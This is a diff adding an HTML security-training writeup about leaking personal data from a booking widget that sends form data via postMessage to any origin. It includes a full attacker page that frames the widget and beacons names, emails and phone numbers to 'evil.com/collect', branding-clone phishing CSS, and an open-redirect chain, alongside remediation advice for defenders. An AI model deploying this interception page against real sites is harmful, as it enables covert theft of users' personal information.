@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PostMessage PII Leak via Widget Framing - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/cors/level3.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High</span>
+      <span class="writeup-category">PostMessage &middot; PII &middot; Framing &middot; Widget</span>
+    </div>
+
+    <h1>PostMessage PII Leak via Widget Framing</h1>
+    <div class="writeup-author">Inspired by <strong>renwa</strong>'s widget security analysis &middot; Affects booking/form widgets with wildcard postMessage</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>A booking widget broadcasts form submission data (first name, last name, email, phone number) via <code>postMessage</code> with <code>targetOrigin: "*"</code>. The widget page has no <code>X-Frame-Options</code> or <code>frame-ancestors</code> CSP. An attacker can iframe the widget, wait for the user to submit the form, and intercept all PII from any origin.</p>
+    </div>
+
+    <h2>The Discovery</h2>
+    <p>While analyzing a meetings/booking widget embedded on a bug bounty target, the researcher noticed the widget iframe communicated with its parent page via postMessage. Examining the widget's JavaScript revealed:</p>
+
+    <pre><code>// Widget source code (meetings widget)
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  var formData = {
+    firstName: document.querySelector('[name="firstName"]').value,
+    lastName: document.querySelector('[name="lastName"]').value,
+    email: document.querySelector('[name="email"]').value,
+    phone: document.querySelector('[name="phone"]').value
+  };
+
+  // VULNERABLE: broadcasts PII to ANY parent with wildcard origin
+  window.parent.postMessage({
+    type: 'formSubmission',
+    data: formData
+  }, '*');  // &lt;-- targetOrigin is "*" !!
+});</code></pre>
+
+    <p>Two critical issues combine here:</p>
+    <ul>
+      <li><strong>Wildcard targetOrigin</strong>: <code>postMessage(data, "*")</code> sends to <strong>any parent origin</strong></li>
+      <li><strong>No framing protection</strong>: Missing <code>X-Frame-Options</code> and no <code>frame-ancestors</code> CSP directive</li>
+    </ul>
+
+    <h2>The Attack</h2>
+    <p>The attacker creates a page that iframes the widget and listens for the postMessage containing PII:</p>
+
+    <pre><code>&lt;!-- Attacker's page: https://evil.com/steal-pii.html --&gt;
+&lt;style&gt;
+  /* Make it look like the legitimate booking page */
+  body { font-family: sans-serif; text-align: center; padding: 40px; }
+  iframe { width: 100%; height: 600px; border: none; }
+&lt;/style&gt;
+
+&lt;h2&gt;Book Your Appointment&lt;/h2&gt;
+&lt;p&gt;Fill out the form below to schedule a meeting.&lt;/p&gt;
+
+&lt;!-- Iframe the vulnerable widget --&gt;
+&lt;iframe src="https://meetings.target.com/book/team/consultation"
+        id="booking-widget"&gt;&lt;/iframe&gt;
+
+&lt;script&gt;
+// Listen for the PII broadcast
+window.addEventListener('message', function(event) {
+  // The widget sends to "*" so we receive it regardless of our origin
+
+  if (event.data && event.data.type === 'formSubmission') {
+    var pii = event.data.data;
+
+    console.log('Stolen PII:', pii);
+    // { firstName: "John", lastName: "Doe",
+    //   email: "john@company.com", phone: "+1-555-0123" }
+
+    // Exfiltrate to attacker server
+    navigator.sendBeacon('https://evil.com/collect',
+      JSON.stringify({
+        firstName: pii.firstName,
+        lastName: pii.lastName,
+        email: pii.email,
+        phone: pii.phone,
+        timestamp: new Date().toISOString()
+      })
+    );
+  }
+
+  // Also intercept "widgetReady" events
+  if (event.data && event.data.type === 'widgetReady') {
+    console.log('Widget loaded - ready to intercept');
+  }
+});
+&lt;/script&gt;</code></pre>
+
+    <h2>Making It Convincing</h2>
+    <p>The attacker can make the phishing page look identical to the legitimate booking page. The iframe loads the real widget from the real domain, so the form itself is 100% legitimate &mdash; SSL certificate, real functionality, real booking confirmation. The victim has no way to know their data is being intercepted:</p>
+
+    <pre><code>&lt;style&gt;
+  /* Clone the target's branding */
+  body {
+    background: #f8fafc;
+    font-family: -apple-system, sans-serif;
+  }
+  .header {
+    background: #1a365d; /* Target's brand color */
+    color: white;
+    padding: 20px;
+  }
+  .header img { height: 40px; }
+  .container {
+    max-width: 800px;
+    margin: 40px auto;
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+    overflow: hidden;
+  }
+  iframe {
+    width: 100%;
+    height: 700px;
+    border: none;
+  }
+&lt;/style&gt;
+
+&lt;div class="header"&gt;
+  &lt;img src="https://target.com/logo.png" alt="Target Company"&gt;
+&lt;/div&gt;
+&lt;div class="container"&gt;
+  &lt;iframe src="https://meetings.target.com/book/team/consultation"&gt;&lt;/iframe&gt;
+&lt;/div&gt;
+
+&lt;!-- Silent PII interception runs in background --&gt;</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>The victim fills out a <strong>real form on a real domain</strong>. The booking actually works. They get a real confirmation. But all their PII (name, email, phone) is silently copied to the attacker. This is more effective than traditional phishing because nothing is fake &mdash; the SSL certificate, the domain, the functionality are all legitimate. The only "fake" part is the parent page, which the user might not even notice.</p>
+    </div>
+
+    <h2>Variations and Escalation</h2>
+
+    <h3>Intercepting Multiple Events</h3>
+    <p>Widgets often broadcast many events beyond form submission:</p>
+    <pre><code>// Events observed via postMessage monitoring:
+{ type: "widgetReady" }                    // Widget loaded
+{ type: "pageView", page: "/booking" }     // Navigation tracking
+{ type: "formSubmission", data: {...} }    // PII!
+{ type: "bookingConfirmed", meetingId: "..." }  // Meeting details
+{ type: "calendarSelected", date: "..." }  // User's availability</code></pre>
+
+    <h3>Chaining with Open Redirect</h3>
+    <p>If the widget page has an open redirect, use it to enhance the phishing:</p>
+    <pre><code>// Send victim through target's own domain first
+https://target.com/redirect?url=https://evil.com/booking-page
+// Victim sees "target.com" briefly, building trust</code></pre>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When auditing widgets/iframes: (1) Check <code>X-Frame-Options</code> and CSP <code>frame-ancestors</code> &mdash; if missing, the page is frameable. (2) Monitor postMessage traffic with <code>window.addEventListener('message', e => console.log(e.origin, e.data))</code>. (3) Check <code>targetOrigin</code> in the source &mdash; search for <code>postMessage(</code> and look at the second argument. If it's <code>"*"</code>, any parent can receive the data. (4) Look at what data is broadcast &mdash; PII, auth tokens, internal IDs. The severity depends on the data sensitivity.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Replace <code>targetOrigin: "*"</code> with the specific parent origin the widget expects</li>
+      <li>Add <code>X-Frame-Options: SAMEORIGIN</code> or CSP <code>frame-ancestors 'self' trusted-parent.com</code></li>
+      <li>Validate the parent origin before sending sensitive data via postMessage</li>
+      <li>Don't broadcast raw PII via postMessage &mdash; send only event identifiers and let the parent fetch data via authenticated API</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: PostMessage PII Leak via Framing &mdash; iframe a widget, intercept the form submission data broadcast to wildcard origin.</p>
+      </div>
+      <a href="/labs/cors/level3.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/cors-any-origin-health-data">&larr; CORS Any Origin Health Data</a>
+      <a href="/writeups/cspt-to-xss">CSPT to XSS &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
